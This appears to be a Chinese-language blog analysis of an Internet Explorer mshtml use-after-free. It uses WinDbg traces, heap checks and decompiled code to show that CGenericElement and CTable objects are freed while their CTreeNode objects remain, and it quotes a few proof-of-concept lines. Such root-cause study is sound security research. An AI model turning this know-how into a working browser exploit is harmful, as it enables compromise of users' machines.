eax.text:68648FC3 and eax, 7FF8FFF2h.text:68648FC8 add eax, 8007000Eh.text:68648FCD pop esi.text:68648FCE pop ebp.text:68648FCF retn 0Ch 可以看到又调用啦 CElement::CElement 函数，现在我们可以做一下总结，当创建一个元素一般经历的步骤是:123456CDocument::createElement |---&gt;CDocument::CreateElementHelper |---&gt;CMarkup::CreateElement |---&gt;mshtml!CreateElement |---&gt;CXXXElement::CreateElement |---&gt;HeapAlloc+CElement::CElement 下面通过在 mshtml!CreateElement + 0x41 和 mshtml!CElement::CElement+0x1e 下断点观测元素创建的过程:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221230:013&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;0:013&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;Matched: 682f141a mshtml!CreateElement = &lt;no type information&gt;Matched: 6832d6de mshtml!CreateElement = &lt;no type information&gt;Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;&apos;0:013&gt; bp 6832d6de+0x37 &quot;ln eax;gc&quot;0:013&gt; bl 0 e 68329ff1 0001 (0001) 0:**** mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot; 1 e 6832d715 0001 (0001) 0:**** mshtml!CreateElement+0x41 &quot;ln eax;gc&quot;0:013&gt; g&apos;=== CElement ===&apos;073bafd8 681b5570 00000001 00000008 00000000073bafe8 00000000 00000000 00000000 00000000073baff8 00000000 00000000(682f77d2) mshtml!CCommentElement::CreateElement | (682f7880) mshtml!`string&apos;Exact matches: mshtml!CCommentElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;060d0fc8 681b5570 00000001 00000008 00000000060d0fd8 00000000 00000000 00000000 00000000060d0fe8 00000000 00000000(682f77d2) mshtml!CCommentElement::CreateElement | (682f7880) mshtml!`string&apos;Exact matches: mshtml!CCommentElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;06058fc8 681b5570 00000001 00000008 0000000006058fd8 00000000 00000000 00000000 0000000006058fe8 00000000 00000000(682f1547) mshtml!CHtmlElement::CreateElement | (682f1598) mshtml!CHtmlElement::`vftable&apos;Exact matches: mshtml!CHtmlElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;06c46fd8 681b5570 00000001 00000008 0000000006c46fe8 00000000 00000000 00000000 0000000006c46ff8 00000000 00000000(682f181d) mshtml!CHeadElement::CreateElement | (682f1868) mshtml!CHeadElement::`vftable&apos;Exact matches: mshtml!CHeadElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;07988fd8 681b5570 00000001 00000008 0000000007988fe8 00000000 00000000 00000000 0000000007988ff8 00000000 00000000&apos;=== CElement ===&apos;072abfd0 681b5570 00000001 00000008 00000000072abfe0 00000000 00000000 00000000 00000000072abff0 00000000 00000000(682f0bba) mshtml!CBodyElement::CreateElement | (682f0c08) mshtml!CBodyElement::CBodyElementExact matches: mshtml!CBodyElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;071f2fd0 681b5570 00000001 00000008 00000000071f2fe0 00000000 00000000 00000000 00000000071f2ff0 00000000 00000000&apos;=== CElement ===&apos;0795efd0 681b5570 00000001 00000008 000000000795efe0 00000000 00000000 00000000 000000000795eff0 00000000 00000000(682f77d2) mshtml!CCommentElement::CreateElement | (682f7880) mshtml!`string&apos;Exact matches: mshtml!CCommentElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;073a8fc8 681b5570 00000001 00000008 00000000073a8fd8 00000000 00000000 00000000 00000000073a8fe8 00000000 00000000(6834f96d) mshtml!CScriptElement::CreateElement | (6834f9b7) mshtml!CScriptElement::CScriptElementExact matches: mshtml!CScriptElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;07a94f98 681b5570 00000001 00000008 0000000007a94fa8 00000000 00000000 00000000 0000000007a94fb8 00000000 00000000ModLoad: 6c020000 6c0d2000 C:\Windows\System32\jscript.dll(682a8f8c) mshtml!CSpanElement::CreateElement | (682a8fd8) mshtml!CSpanElement::`vftable&apos;Exact matches: mshtml!CSpanElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;07ac1fd8 681b5570 00000001 00000008 0000000007ac1fe8 00000000 00000000 00000000 0000000007ac1ff8 00000000 00000000(682a8f8c) mshtml!CSpanElement::CreateElement | (682a8fd8) mshtml!CSpanElement::`vftable&apos;Exact matches: mshtml!CSpanElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;07ae1fd8 681b5570 00000001 00000008 0000000007ae1fe8 00000000 00000000 00000000 0000000007ae1ff8 00000000 00000000(682a8f8c) mshtml!CSpanElement::CreateElement | (682a8fd8) mshtml!CSpanElement::`vftable&apos;Exact matches: mshtml!CSpanElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;07ad7fd8 681b5570 00000001 00000008 0000000007ad7fe8 00000000 00000000 00000000 0000000007ad7ff8 00000000 00000000(682bc4de) mshtml!CGenericElement::CreateElement | (682bc523) mshtml!CGenericElement::CGenericElementExact matches: mshtml!CGenericElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;06c81fc8 681b5570 00000001 00000008 0000000006c81fd8 00000000 00000000 00000000 0000000006c81fe8 00000000 00000000(6829a55d) mshtml!CTable::CreateElement | (6829a59e) mshtml!CTable::CTableExact matches: mshtml!CTable::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;07b82fb8 681b5570 00000001 00000008 0000000007b82fc8 00000000 00000000 00000000 0000000007b82fd8 00000000 00000000(6828d66d) mshtml!CHRElement::CreateElement | (6828d6c3) mshtml!CHRElement::ApplyDefaultFormatExact matches: mshtml!CHRElement::CreateElement = &lt;no type information&gt;&apos;=== CElement ===&apos;06f65fd8 681b5570 00000001 00000008 0000000006f65fe8 00000000 00000000 00000000 0000000006f65ff8 00000000 00000000(6cc.b80): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=686e9100 ebx=0791dfb0 ecx=06c81fc8 edx=00000000 esi=0469d170 edi=00000000eip=6836b68d esp=0469d144 ebp=0469d15c iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246mshtml!CElement::Doc:6836b68d 8b01 mov eax,dword ptr [ecx] ds:0023:06c81fc8=???????? 由上可以观察到创建各元素时调用的函数及元素所在内存的值，偏移0为虚表地址，偏移4为引用计数。下面来看下 poc 里的第二个语句。1document.body.appendChild(f0); windbg 查看包含 appendChild 的符号。12345670:005&gt; x mshtml!*appendChild*682c5acf mshtml!CElement::appendChild = &lt;no type information&gt;68511590 mshtml!CAttribute::appendChild = &lt;no type information&gt;685109f4 mshtml!CDOMTextNode::appendChild = &lt;no type information&gt;683fd1d8 mshtml!s_methdescCAttributeappendChild = &lt;no type information&gt;6837d720 mshtml!s_methdescCElementappendChild = &lt;no type information&gt;682cd65e mshtml!CDocument::appendChild = &lt;no type information&gt; 可以猜到处理函数为 mshtml!CElement::appendChild,可以看到这个函数实际上又调用了 CElement::insertBefore 函数。同上面的创建元素的函数一样，又会调用一个 xxxHelper 的函数，如下图。动态分析对 CElement::InsertBeforeHelper 函数功能进行猜测，注释见下图(很多都是猜的，不确定对不对)。跟进函数 sub_686659BA,调试信息如下。12345678910111213141516171819202122232425262728293031320:005&gt; eax=0487cfac ebx=05f9ef30 ecx=00000000 edx=00000000 esi=05f1afd0 edi=0766bfd8eip=686659cb esp=0487cf10 ebp=0487cf90 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CCommentElement::`scalar deleting destructor&apos;+0x18d:686659cb 8bcf mov ecx,edi0:005&gt; ln poi(edi)(68648fd8) mshtml!CSpanElement::`vftable&apos; | (685573d8) mshtml!CBlockElement::`vftable&apos;Exact matches: mshtml!CSpanElement::`vftable&apos; = &lt;no type information&gt;0:005&gt; peax=0487cfac ebx=05f9ef30 ecx=0766bfd8 edx=00000000 esi=05f1afd0 edi=0766bfd8eip=686659cd esp=0487cf10 ebp=0487cf90 iopl=0 nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000206mshtml!CCommentElement::`scalar deleting destructor&apos;+0x18f:686659cd e8bb5c0a00 call mshtml!CElement::Doc (6870b68d)0:005&gt; eax=05b8b680 ebx=05f9ef30 ecx=0766bfd8 edx=6870b65d esi=05f1afd0 edi=0766bfd8eip=686659d2 esp=0487cf10 ebp=0487cf90 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CCommentElement::`scalar deleting destructor&apos;+0x194:686659d2 8b4f1c mov ecx,dword ptr [edi+1Ch] ds:0023:0766bff4=000100000:005&gt; ln poi(eax)(68702028) mshtml!CDoc::`vftable&apos; | (6870fc58) mshtml!CDoc::`vftable&apos;Exact matches: mshtml!CDoc::`vftable&apos; = &lt;no type information&gt;0:005&gt; peax=05b8b680 ebx=05f9ef30 ecx=00010000 edx=6870b65d esi=05f1afd0 edi=0766bfd8eip=686659d5 esp=0487cf10 ebp=0487cf90 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CCommentElement::`scalar deleting destructor&apos;+0x197:686659d5 c1e909 shr ecx,9 通过 mshtml!CElement::Doc 函数获取 CDoc,在这里表示 html 文档，用于下面的插入，继续跟，发现在跳转后又调用了 CDoc::InsertElement 函数。继续分析， 两次调用 CTreePosGap::MoveTo 函数应该是确定插入的开始和结束位置。之后又调用了 CMarkup::InsertElementInternal 函数。太菜，已经逆到吐，就把函数的功能贴出来吧。CMarkup::InsertElementInternal 函数会在 DOM 树搜索准备插入的分支节点，之后调用 CTreeNode::CTreeNode 构建添加元素的 DOM 节点。CTreeNode 数据结构大致如下(参考:IE DOM 树概览)123456789101112131415161718192021222324class CTreeNode&#123;public: CElement * element; CTreeNode * parent; BYTE _etag; // 0-7: element tag BYTE _fFirstCommonAncestorNode : 1; // 8: for finding common ancestor BYTE _fInMarkup : 1; // 9: this node is in a markup and shouldn't die BYTE _fInMarkupDestruction : 1; // 10: Used by CMarkup::DestroySplayTree BYTE _fHasLookasidePtr : 2; // 11-12 Lookaside flags BYTE _fBlockNess : 1; // 13: Cached from format -- valid if _iFF != -1 BYTE _fHasLayout : 1; // 14: Cached from format -- valid if _iFF != -1 BYTE _fUnused : 1; // 15: Unused SHORT _iPF; // 16-31: Paragraph Format // DWORD 2 SHORT _iCF; // 0-15: Char Format SHORT _iFF; CTreePos _tpBegin; CTreePos _tpEnd; DWORD unknow1; DWORD unknow2; DWORD unknow3;&#125;; 每创建一个元素都会创建相应的 CTreeNode，存储着元素的相关信息，并通过 CTreePos 对象构成 DOM 树。12345678910class CTreePos&#123;public: DWORD _cElemLeftAndFlags; DWORD _cchLeft; // 左子树中的字符数量 CTreePos* _pFirstChild; CTreePos* _pNext; CTreePos* _pLeft; // 当前 CTreePos 在 DOM 流中的左边 CTreePos* _pRight; // 当前 CTreePos 在 DOM 流中的右边&#125; 下面通过 windbg 调试观察 CTreeNode 和相应元素创建时在内存中的关系，调试信息如下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758590:012&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4);gc&quot;0:012&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;Matched: 682f141a mshtml!CreateElement = &lt;no type information&gt;Matched: 6832d6de mshtml!CreateElement = &lt;no type information&gt;Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax;gc&quot;&apos;0:012&gt; bu 6832d6de + 0x41 &quot;ln eax;gc&quot;0:012&gt; bu mshtml!CMarkup::InsertElementInternal+1ec &quot;.echo &apos;=== CTreeNode ===&apos;; dd eax L1; dps poi(eax) L1;gc&quot;0:012&gt; g............................&apos;=== CElement ===&apos;05ca1fd8 681b5570 00000001 00000008 0000000005ca1fe8 00000000 00000000 00000000 0000000005ca1ff8 00000000 00000000&apos;=== CTreeNode ===&apos;07b3cfb0 05ca1fd805ca1fd8 682a8fd8 mshtml!CSpanElement::`vftable&apos;&apos;=== CElement ===&apos;07b6efd8 681b5570 00000001 00000008 0000000007b6efe8 00000000 00000000 00000000 0000000007b6eff8 00000000 00000000&apos;=== CTreeNode ===&apos;053d6fb0 07b6efd807b6efd8 682a8fd8 mshtml!CSpanElement::`vftable&apos;&apos;=== CElement ===&apos;07b46fd8 681b5570 00000001 00000008 0000000007b46fe8 00000000 00000000 00000000 0000000007b46ff8 00000000 00000000&apos;=== CTreeNode ===&apos;06bf6fb0 07b46fd807b46fd8 682a8fd8 mshtml!CSpanElement::`vftable&apos;&apos;=== CElement ===&apos;06c68fc8 681b5570 00000001 00000008 0000000006c68fd8 00000000 00000000 00000000 0000000006c68fe8 00000000 00000000&apos;=== CTreeNode ===&apos;042f2fb0 06c68fc806c68fc8 682bc590 mshtml!CGenericElement::`vftable&apos;&apos;=== CElement ===&apos;08177fb8 681b5570 00000001 00000008 0000000008177fc8 00000000 00000000 00000000 0000000008177fd8 00000000 00000000&apos;=== CTreeNode ===&apos;07b34fb0 08177fb808177fb8 681b6488 mshtml!CTable::`vftable&apos;&apos;=== CElement ===&apos;05ca7fd8 681b5570 00000001 00000008 0000000005ca7fe8 00000000 00000000 00000000 0000000005ca7ff8 00000000 00000000&apos;=== CTreeNode ===&apos;05feffb0 05ca7fd805ca7fd8 681b9250 mshtml!CHRElement::`vftable&apos;(ae4.dc8): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=686e9100 ebx=042f2fb0 ecx=06c68fc8 edx=00000000 esi=0486cd10 edi=00000000eip=6836b68d esp=0486cce4 ebp=0486ccfc iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246mshtml!CElement::Doc:6836b68d 8b01 mov eax,dword ptr [ecx] ds:0023:06c68fc8=???????? 可以看到 CTreeNode 的开始存放的是 element 的地址，和 CTreeNode 的数据结构吻合。元素对象的开始四字节是对应元素的虚表地址，第二个四字节是引用计数。下面继续分析 poc 里的 offsetParent。1f0.offsetParent=null; windbg 搜索 offsetParent 的相关函数。1234567891011121314150:005&gt; x mshtml!*offsetParent*681e128e mshtml!CDisplayRequestGetOffsetParent::~CDisplayRequestGetOffsetParent = &lt;no type information&gt;681e11ca mshtml!CDisplayRequestGetOffsetParent::CDisplayRequestGetOffsetParent = &lt;no type information&gt;681e16cd mshtml!CDisplayBox::IsOffsetParent = &lt;no type information&gt;681e1709 mshtml!CDisplayBox::FindOffsetParent = &lt;no type information&gt;681d9d65 mshtml!CDisplayRequestGetOffsetParent::GetOffsetTopLeft = &lt;no type information&gt;681e12b3 mshtml!CLayoutBlock::IsOffsetParent = &lt;no type information&gt;681e1915 mshtml!CDisplayRequestGetOffsetParent::SetOffsetParentDisplayBox = &lt;no type information&gt;681e11e3 mshtml!CDisplayRequestGetOffsetParent::OffsetParent = &lt;no type information&gt;682bcd62 mshtml!CElement::GetOffsetParentHelper = &lt;no type information&gt;681e19b1 mshtml!CTextDisplayBox::IsOffsetParent = &lt;no type information&gt;6837c914 mshtml!s_propdescCElementoffsetParent = &lt;no type information&gt;681e192d mshtml!CDisplayRequestGetOffsetParent::SetSourceDisplayBox = &lt;no type information&gt;682bd418 mshtml!CElement::get_offsetParent = &lt;no type information&gt;681e1798 mshtml!CDisplayBox::TransformRectToOffsetParent = &lt;no type information&gt; 由上面的信息可以猜测到 offsetParent 和函数 mshtml!CElement::get_offsetParent 及 mshtml!CElement::GetOffsetParentHelper 有关系。实际上 CElement::get_offsetParent 中调用了 CElement::GetOffsetParentHelper。1234567891011121314151617181920212223242526int __thiscall CElement::get_offsetParent(CElement *ecx0, CElement *this, struct IHTMLElement **a3)&#123; int v3; // ebx struct CTreeNode *v4; // eax v3 = 0; if ( a3 ) &#123; if ( *((_DWORD *)this + 5) ) &#123; *a3 = 0; v4 = CElement::GetOffsetParentHelper(ecx0); if ( v4 &amp;&amp; *((_BYTE *)v4 + 8) != 82 ) v3 = CTreeNode::GetElementInterface(v4, &amp;IID_IHTMLElement, (void **)a3); &#125; else &#123; v3 = -2147467259; &#125; &#125; else &#123; v3 = -2147467261; &#125; return CBase::SetErrorInfo(ecx0, v3);&#125; 漏洞原因在 poc 分析的时候已经可以得到漏洞是由于 CGenericElement 在释放后又被引用导致的，一般会发生在下面两种情况下。 CGenericElement 对象的指针存储到 CTreeNode 结构中时，CGenericElement 的引用计数没有加一, 导致CGenericElement 提前释放。 CTreeNode 没有在 CGenericElement 元素释放的时候被释放。一般是由于 CTreeNode 的引用计数错误的加1 如何判断属于上面哪一种情况呢？在程序结尾处观察 CGenericElement 和 CTreeNode 是否被释放，调试信息如下。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651660:013&gt; bu mshtml!CElement::CElement+0x1e &quot;.echo &apos;=== CElement ===&apos;; dd edi l(28/4)&quot;0:013&gt; bu mshtml!CreateElement + 0x41 &quot;ln eax&quot;Matched: 6869141a mshtml!CreateElement = &lt;no type information&gt;Matched: 686cd6de mshtml!CreateElement = &lt;no type information&gt;Ambiguous symbol error at &apos;mshtml!CreateElement + 0x41 &quot;ln eax&quot;&apos;0:013&gt; bu 686cd6de + 0x41 &quot;ln eax&quot;0:013&gt; bu mshtml!CMarkup::InsertElementInternal+1ec &quot;.echo &apos;=== CTreeNode ===&apos;; dd eax; dps poi(eax) L1&quot;0:013&gt; g.............................................0:005&gt; gModLoad: 6bf30000 6bfe2000 C:\Windows\System32\jscript.dll&apos;=== CElement ===&apos;079f7fd8 68555570 00000001 00000008 00000000079f7fe8 00000000 00000000 00000000 00000000079f7ff8 00000000 00000000eax=079f7fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=079f7fd8 edi=079f7fd8eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CElement::CElement+0x1e:686c9ff1 8b03 mov eax,dword ptr [ebx] ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;0:005&gt; g&apos;=== CTreeNode ===&apos;079d9fb0 079f7fd8 079edfb0 ffff005b ffffffff079d9fc0 00000000 00000000 00000000 00000000079d9fd0 00000000 00000000 00000000 00000000079d9fe0 00000000 00000000 00000000 00000000079d9ff0 00000008 00000000 00000000 d0d0d0d0079da000 ???????? ???????? ???????? ????????079da010 ???????? ???????? ???????? ????????079da020 ???????? ???????? ???????? ????????079f7fd8 68648fd8 mshtml!CSpanElement::`vftable&apos;eax=079d9fb0 ebx=00000000 ecx=079d9fb0 edx=00000008 esi=079d9fb0 edi=079f7fd8eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CMarkup::InsertElementInternal+0x253:6864b0bd 395c2410 cmp dword ptr [esp+10h],ebx ss:0023:0451c848=000000000:005&gt; g&apos;=== CElement ===&apos;07a90fd8 68555570 00000001 00000008 0000000007a90fe8 00000000 00000000 00000000 0000000007a90ff8 00000000 00000000eax=07a90fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a90fd8 edi=07a90fd8eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CElement::CElement+0x1e:686c9ff1 8b03 mov eax,dword ptr [ebx] ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;0:005&gt; g&apos;=== CTreeNode ===&apos;079e1fb0 07a90fd8 079edfb0 ffff005b ffffffff079e1fc0 00000000 00000000 00000000 00000000079e1fd0 00000000 00000000 00000000 00000000079e1fe0 00000000 00000000 00000000 00000000079e1ff0 00000008 00000000 00000000 d0d0d0d0079e2000 ???????? ???????? ???????? ????????079e2010 ???????? ???????? ???????? ????????079e2020 ???????? ???????? ???????? ????????07a90fd8 68648fd8 mshtml!CSpanElement::`vftable&apos;eax=079e1fb0 ebx=00000000 ecx=079e1fb0 edx=00000008 esi=079e1fb0 edi=07a90fd8eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CMarkup::InsertElementInternal+0x253:6864b0bd 395c2410 cmp dword ptr [esp+10h],ebx ss:0023:0451c848=000000000:005&gt; g&apos;=== CElement ===&apos;07a63fd8 68555570 00000001 00000008 0000000007a63fe8 00000000 00000000 00000000 0000000007a63ff8 00000000 00000000eax=07a63fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a63fd8 edi=07a63fd8eip=686c9ff1 esp=0451c8c4 ebp=0451c8d0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CElement::CElement+0x1e:686c9ff1 8b03 mov eax,dword ptr [ebx] ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;0:005&gt; g&apos;=== CTreeNode ===&apos;07a9cfb0 07a63fd8 079edfb0 ffff005b ffffffff07a9cfc0 00000000 00000000 00000000 0000000007a9cfd0 00000000 00000000 00000000 0000000007a9cfe0 00000000 00000000 00000000 0000000007a9cff0 00000008 00000000 00000000 d0d0d0d007a9d000 ???????? ???????? ???????? ????????07a9d010 ???????? ???????? ???????? ????????07a9d020 ???????? ???????? ???????? ????????07a63fd8 68648fd8 mshtml!CSpanElement::`vftable&apos;eax=07a9cfb0 ebx=00000000 ecx=07a9cfb0 edx=00000008 esi=07a9cfb0 edi=07a63fd8eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CMarkup::InsertElementInternal+0x253:6864b0bd 395c2410 cmp dword ptr [esp+10h],ebx ss:0023:0451c848=000000000:005&gt; g&apos;=== CElement ===&apos;076fefc8 68555570 00000001 00000008 00000000076fefd8 00000000 00000000 00000000 00000000076fefe8 00000000 00000000eax=076fefc8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=076fefc8 edi=076fefc8eip=686c9ff1 esp=0451c89c ebp=0451c8a8 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CElement::CElement+0x1e:686c9ff1 8b03 mov eax,dword ptr [ebx] ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;0:005&gt; g&apos;=== CTreeNode ===&apos;0770cfb0 076fefc8 07a9cfb0 ffff0075 ffffffff0770cfc0 00000000 00000000 00000000 000000000770cfd0 00000000 00000000 00000000 000000000770cfe0 00000000 00000000 00000000 000000000770cff0 00000008 00000000 00000000 d0d0d0d00770d000 ???????? ???????? ???????? ????????0770d010 ???????? ???????? ???????? ????????0770d020 ???????? ???????? ???????? ????????076fefc8 6865c590 mshtml!CGenericElement::`vftable&apos;eax=0770cfb0 ebx=00000000 ecx=0770cfb0 edx=00000008 esi=0770cfb0 edi=076fefc8eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CMarkup::InsertElementInternal+0x253:6864b0bd 395c2410 cmp dword ptr [esp+10h],ebx ss:0023:0451c848=000000000:005&gt; g&apos;=== CElement ===&apos;07a80fb8 68555570 00000001 00000008 0000000007a80fc8 00000000 00000000 00000000 0000000007a80fd8 00000000 00000000eax=07a80fb8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=07a80fb8 edi=07a80fb8eip=686c9ff1 esp=0451c8a8 ebp=0451c8b4 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CElement::CElement+0x1e:686c9ff1 8b03 mov eax,dword ptr [ebx] ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;0:005&gt; g&apos;=== CTreeNode ===&apos;07a72fb0 07a80fb8 079e1fb0 ffff0061 ffffffff07a72fc0 00000000 00000000 00000000 0000000007a72fd0 00000000 00000000 00000000 0000000007a72fe0 00000000 00000000 00000000 0000000007a72ff0 00000008 00000000 00000000 d0d0d0d007a73000 ???????? ???????? ???????? ????????07a73010 ???????? ???????? ???????? ????????07a73020 ???????? ???????? ???????? ????????07a80fb8 68556488 mshtml!CTable::`vftable&apos;eax=07a72fb0 ebx=00000000 ecx=07a72fb0 edx=00000008 esi=07a72fb0 edi=07a80fb8eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CMarkup::InsertElementInternal+0x253:6864b0bd 395c2410 cmp dword ptr [esp+10h],ebx ss:0023:0451c848=000000000:005&gt; g&apos;=== CElement ===&apos;05ec0fd8 68555570 00000001 00000008 0000000005ec0fe8 00000000 00000000 00000000 0000000005ec0ff8 00000000 00000000eax=05ec0fd8 ebx=06cc0680 ecx=68a891a0 edx=00000000 esi=05ec0fd8 edi=05ec0fd8eip=686c9ff1 esp=0451c8b4 ebp=0451c8c0 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246mshtml!CElement::CElement+0x1e:686c9ff1 8b03 mov eax,dword ptr [ebx] ds:0023:06cc0680=&#123;mshtml!CDoc::`vftable&apos; (68702028)&#125;0:005&gt; g&apos;=== CTreeNode ===&apos;05ee3fb0 05ec0fd8 079d9fb0 ffff0030 ffffffff05ee3fc0 00000000 00000000 00000000 0000000005ee3fd0 00000000 00000000 00000000 0000000005ee3fe0 00000000 00000000 00000000 0000000005ee3ff0 00000008 00000000 00000000 d0d0d0d005ee4000 ???????? ???????? ???????? ????????05ee4010 ???????? ???????? ???????? ????????05ee4020 ???????? ???????? ???????? ????????05ec0fd8 68559250 mshtml!CHRElement::`vftable&apos;eax=05ee3fb0 ebx=00000000 ecx=05ee3fb0 edx=00000008 esi=05ee3fb0 edi=05ec0fd8eip=6864b0bd esp=0451c838 ebp=0451c8c8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!CMarkup::InsertElementInternal+0x253:6864b0bd 395c2410 cmp dword ptr [esp+10h],ebx ss:0023:0451c848=00000000 然后查看 CGenericElement 和 CTable 元素及对应的 CTreeNode 是否被释放。12345678910111213141516171819202122230:005&gt; !heap -p -a 076fefc8 CGenericElement address 076fefc8 found in _DPH_HEAP_ROOT @ 151000 in free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize) 7b7064c: 76fe000 2000 0:005&gt; !heap -p -a 0770cfb0 CGenericElement对应的CTreeNode address 0770cfb0 found in _DPH_HEAP_ROOT @ 151000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 78720d0: 770cfb0 4c - 770c000 2000 0:005&gt; !heap -p -a 07a80fb8 CTable address 07a80fb8 found in _DPH_HEAP_ROOT @ 151000 in free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize) 7b70f08: 7a80000 20000:005&gt; !heap -p -a 07a72fb0 CTable对应的CTreeNode address 07a72fb0 found in _DPH_HEAP_ROOT @ 151000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 7872034: 7a72fb0 4c - 7a72000 2000 可以看到 CGenericElement 和 CTable 都已经被释放，但是 CTreeNode 并没有被释放。所以属于第二种情况。可以猜测可能是由于当对CTreeNode指向的元素进行访问时，因为已经被删除，所以发生了异常。下面我们来看下哪些函数对 CGenericElement 的 CTreeNode 进行了访问(地址和上面调试的有出入，因为重新调了下)。由调试可知，ISpanQualifier::GetFancyFormat 函数里的 CTreeNode 参数来自于上一个函数的 esi,调试信息如下。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667680:013&gt; bu ISpanQualifier::GetFancyFormat0:013&gt; gModLoad: 6c020000 6c0d2000 C:\Windows\System32\jscript.dllBreakpoint 0 hiteax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429af esp=0448acf0 ebp=0448acfc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat:682429af 8bff mov edi,edi0:005&gt; peax=06ad8fb0 ebx=059d3fa0 ecx=00000805 edx=059d3fa0 esi=06ad8fb0 edi=0448ad28eip=682429b1 esp=0448acf0 ebp=0448acfc iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202mshtml!ISpanQualifier::GetFancyFormat+0x2:682429b1 55 push ebp0:005&gt; eax=06ad8fb0 ebx=059d3fa0 